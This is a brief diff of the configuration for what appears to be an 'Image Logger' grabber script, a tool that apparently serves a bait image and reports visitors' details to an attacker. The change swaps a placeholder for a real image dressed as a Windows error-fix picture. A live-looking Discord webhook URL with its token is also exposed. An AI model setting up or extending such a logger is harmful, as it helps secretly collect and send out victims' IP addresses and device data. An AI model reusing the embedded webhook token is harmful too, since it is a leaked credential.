@@ -12,7 +12,7 @@ __author__ = "Tgace + ChatGPT"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1347691418423918612/TY4jhuDOUeauxK-VGtvdqf0jcfI3xhAKkthZ2hoNQz3cHFxIu-12AEcSY7_e3WkU643q",
-    "image": "https://your-default-image.png",
+    "image": "https://static1.howtogeekimages.com/wordpress/wp-content/uploads/2023/04/1-fix-operation-did-not-complete-error-featured.png",
     "imageArgument": True,
     "username": "Image Logger",
     "color": 0xff0000,
